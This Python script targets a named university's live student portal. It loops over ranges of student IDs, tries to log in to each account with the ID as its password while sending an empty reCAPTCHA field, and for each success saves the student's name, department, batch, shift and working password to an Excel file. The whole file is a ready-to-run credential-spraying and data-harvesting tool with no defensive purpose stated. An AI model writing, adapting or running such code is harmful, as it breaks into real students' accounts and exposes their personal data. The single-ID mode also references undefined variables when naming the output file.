import requests
from openpyxl import Workbook
from openpyxl.styles import PatternFill

def fetch_student_info(payload, headers):
    url_info = "http://software.diu.edu.bd:8006/result/studentInfo"
    params = {"studentId": payload["password"]}
    response_info = requests.get(url_info, headers=headers, params=params)
    if response_info.status_code == 200:
        return response_info.json()
    else:
        return None

def check(payload, ws):
    headers = {
        "Content-Type": "application/json",
        "Origin": "http://studentportal.diu.edu.bd",
        "Referer": "http://studentportal.diu.edu.bd/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    url_login = "http://software.diu.edu.bd:8006/login"
    
    try:
        response_login = requests.post(url_login, json=payload, headers=headers)
        data_login = response_login.json()
        
        if data_login["message"] == "success":
            student_info = fetch_student_info(payload, headers)
            if student_info:
                row = [
                    student_info["studentName"],
                    student_info["studentId"],
                    payload["password"],  # Student Portal Password
                    student_info["departmentName"],
                    student_info["batchId"],
                    student_info["shift"],
                    "Success"  # Adding a status column
                ]
                ws.append(row)
                if len(ws._cells) > 7:  # Check if worksheet has more than headers
                    for cell in ws[ws.max_row]:
                        cell.fill = PatternFill(start_color="0000FF", end_color="0000FF", fill_type="solid")

        else:
            # Add row without password and apply red row color
            row = [
                payload["username"],
                "",
                "",
                "",
                "",
                "",
                "Failed"  # Adding a status column
            ]
            ws.append(row)
            if len(ws._cells) > 7:  # Check if worksheet has more than headers
                for cell in ws[ws.max_row]:
                    cell.fill = PatternFill(start_color="0000FF", end_color="0000FF", fill_type="solid")

    except Exception as e:
        print(f"Exception occurred for ID: {payload['username']}. Exception: {e}")
        row = [
            payload["username"],
            "",
            "",
            "",
            "",
            "",
            f"Error: {e}"  # Adding a status column with error message
        ]
        ws.append(row)
        if len(ws._cells) > 7:  # Check if worksheet has more than headers
                for cell in ws[ws.max_row]:
                    cell.fill = PatternFill(start_color="0000FF", end_color="0000FF", fill_type="solid")


def main():
    choice = int(input("Enter '1' for a single search or '2' for a range-based search: "))

    wb = Workbook()
    ws = wb.active
    ws.append(["Name", "Student ID", "Student Portal Password", "Department", "Batch", "Shift", "Status"])  # Headers

    if choice == 1:
        Id = input("Please enter the ID: ")
        payload = {
            "username": f"{Id}",
            "password": f"{Id}",
            "grecaptcha": ""
        }
        check(payload, ws)
    elif choice == 2:
        Batch_code = input("Please enter the Batch Code: ")
        Dept_code = input("Please enter the Department Code: ")
        id_range_lower_bound = input("Please enter the Lower Bound ID: ")
        id_range_upper_bound = input("Please enter the Upper Bound ID: ")
        print("\nProcessing range-based search...")
        for id in range(int(id_range_lower_bound), int(id_range_upper_bound) + 1):
            payload = {
                "username": f"{Batch_code}-{Dept_code}-{str(id)}",
                "password": f"{Batch_code}-{Dept_code}-{str(id)}",
                "grecaptcha": ""
            }
            check(payload, ws)

    filename = f"{Batch_code}-{Dept_code}-{id_range_lower_bound}_to_{id_range_upper_bound}.xlsx"
    wb.save(filename)
    print(f"Excel file saved as: {filename}")

if __name__ == "__main__":
    main()
